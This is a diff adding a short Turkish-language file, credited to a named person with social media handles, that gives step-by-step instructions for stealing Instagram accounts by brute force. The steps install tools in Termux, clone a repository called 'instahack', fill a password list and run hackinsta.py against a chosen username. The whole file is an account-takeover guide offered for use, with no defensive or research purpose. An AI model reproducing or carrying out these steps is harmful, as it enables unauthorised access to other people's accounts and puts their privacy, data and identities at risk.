@@ -1,0 +1,20 @@
+Bu Hesap çalma bilgiler'i Serdar Oruçli'ye aittir
+Instagram=@serdar_2177
+Twitter=serdarorucli21
+Bugün Instagram hesap çalma'nın değişik bir yöntemini göstereceğim
+Brute force attack (kaba kuvvet) 
+Kodlar;
+1- pkg install git
+2-pkg install python
+3-pkg install nano
+4-pip install requests
+5-git clonehttps://github.com/fuck3erboy/instahack
+6-ls
+7-cd instahack
+8-ls
+9-nano pass.txt
+aklınıza gelen bütün şifreleri yazın
+ctrl +e+x+enter yapın kayıt edin
+python hackinsta.py
+kullanıcı adını yazın
+saldırı başlar
